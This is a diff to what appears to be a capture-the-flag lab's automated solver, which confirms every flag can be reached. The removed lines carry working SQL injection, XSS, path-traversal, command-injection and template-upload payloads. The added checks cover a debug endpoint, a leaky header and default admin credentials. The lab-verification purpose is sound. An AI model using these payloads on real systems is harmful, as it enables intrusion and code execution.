@@ -1,4 +1,4 @@
-// Automated solver: proves all 15 flags are actually reachable.
+// Automated solver: proves all 10 flags are actually reachable.
 import fs from 'node:fs'
 import path from 'node:path'
 import { fileURLToPath } from 'node:url'
@@ -63,49 +63,21 @@ check(5, 'IDOR', user.text.includes(FLAGS[4].flag))
 const err = await get('/api/search?q=' + encodeURIComponent("'"))
 check(6, 'error SQLi', err.text.includes(FLAGS[5].flag))
 
-// 07 - union based SQLi
-const union = await get('/api/search?q=' + encodeURIComponent("' UNION SELECT id, flag, flag FROM secret_flags -- "))
-check(7, 'union SQLi', union.text.includes(FLAGS[6].flag))
+// 07 - exposed debug endpoint
+const debug = await get('/api/debug')
+check(7, 'debug endpoint', debug.text.includes(FLAGS[6].flag))
 
-// 08 - boolean blind SQLi
-const blind = await get('/api/item?id=' + encodeURIComponent("1 AND substr((SELECT flag FROM secret_flags WHERE id=8),1,1)='R'"))
-check(8, 'boolean blind SQLi', blind.text.includes('"found":true'))
+// 08 - flag in response header
+const health = await get('/api/health')
+check(8, 'header disclosure', health.res.headers.get('x-ctf-flag') === FLAGS[7].flag && health.text.includes(`"flags":${FLAGS.length}`))
 
-// 09 - stored XSS sink
-const mainJsx = fs.readFileSync(path.join(ROOT, '../client/src/main.jsx'), 'utf8')
-const posted = await postJson('/api/comments', { author: 'verifier', body: '<img src=x onerror="alert(1)">' })
-const comments = await get('/api/comments')
-check(9, 'stored XSS', mainJsx.includes(FLAGS[8].flag) && posted.text.includes('"ok":true') && comments.text.includes('<img src=x'))
+// 09 - secret shipped in static client config
+const config = await get('/assets/config.js')
+check(9, 'client-side secret', config.text.includes(FLAGS[8].flag))
 
-// 10 - reflected XSS
-const greet = await get('/greet?name=guest')
-const greetCookies = (greet.res.headers.getSetCookie?.() || []).map((c) => decodeURIComponent(c)).join(' ')
-check(10, 'reflected XSS', greetCookies.includes(FLAGS[9].flag))
-
-// 11 - LFI
-const lfi = await get('/page?page=' + encodeURIComponent('../../data/secrets/lfi_flag.txt'))
-check(11, 'LFI', lfi.text.includes(FLAGS[10].flag))
-
-// 12 - download traversal
-const dl = await get('/download?file=' + encodeURIComponent('../secrets/download_flag.txt'))
-check(12, 'download traversal', dl.text.includes(FLAGS[11].flag))
-
-// 13 - command injection
-const ping = await get('/api/ping?host=' + encodeURIComponent('127.0.0.1; cat data/secrets/cmd_flag.txt'))
-check(13, 'command injection', ping.text.includes(FLAGS[12].flag), ping.text.slice(0, 100))
-
-// 14 - upload + EJS render
-const form = new FormData()
-form.append('file', new Blob(['<%= process.env.CTF_FLAG_14 %>'], { type: 'text/plain' }), 'shell.ejs')
-const upRes = await fetch(BASE + '/api/upload', { method: 'POST', body: form })
-const upData = await upRes.json()
-const rendered = await get('/render?view=' + encodeURIComponent(upData.filename || 'shell.ejs'))
-check(14, 'upload + template RCE', rendered.text.includes(FLAGS[13].flag), rendered.text.slice(0, 80))
-
-// 15 - backup chain
-const backup = await get('/backup/db.js.bak')
-const chain = await get('/api/search?q=' + encodeURIComponent("' UNION SELECT id, note, note FROM vault -- "))
-check(15, 'backup + union chain', backup.text.includes('vault') && chain.text.includes(FLAGS[14].flag))
+// 10 - legacy login with default credentials
+const legacy = await postJson('/legacy-login', { username: 'admin', password: 'admin' })
+check(10, 'default credentials', legacy.text.includes(FLAGS[9].flag))
 
 // authenticated checker
 let allSubmitted = true
@@ -113,12 +85,12 @@ for (const f of FLAGS) {
   const r = await postJson('/api/submit', { flag: f.flag }, { Cookie: playerCookie })
   if (!r.text.includes('"status":"correct"')) allSubmitted = false
 }
-check(17, 'flag checker accepts all 15', allSubmitted)
+check(17, `flag checker accepts all ${FLAGS.length}`, allSubmitted)
 
 const board = await get('/api/leaderboard')
 const boardData = JSON.parse(board.text)
 const myRow = boardData.rows.find((row) => row.username === playerName)
-check(18, 'REST leaderboard reflects solves', !!myRow && myRow.solved === 15 && myRow.points === TOTAL_POINTS)
+check(18, 'REST leaderboard reflects solves', !!myRow && myRow.solved === FLAGS.length && myRow.points === TOTAL_POINTS)
 
 const stream = await fetch(`${BASE}/api/leaderboard/stream`)
 const streamType = stream.headers.get('content-type') || ''
@@ -130,16 +102,11 @@ check(19, 'live leaderboard SSE stream', streamType.includes('text/event-stream'
 
 // Remove artifacts created by this run so the event starts clean.
 const { db } = await import('./db.js')
-db.prepare("DELETE FROM comments WHERE author = 'verifier'").run()
 const verifier = db.prepare('SELECT id FROM players WHERE username = ?').get(playerName)
 if (verifier) {
   db.prepare('DELETE FROM player_submissions WHERE player_id = ?').run(verifier.id)
   db.prepare('DELETE FROM player_sessions WHERE player_id = ?').run(verifier.id)
   db.prepare('DELETE FROM players WHERE id = ?').run(verifier.id)
-}
-for (const name of fs.readdirSync(path.join(ROOT, 'uploads'))) {
-  if (name === '.gitkeep') continue
-  fs.rmSync(path.join(ROOT, 'uploads', name), { force: true })
 }
 
 const failed = results.filter((r) => !r.ok)
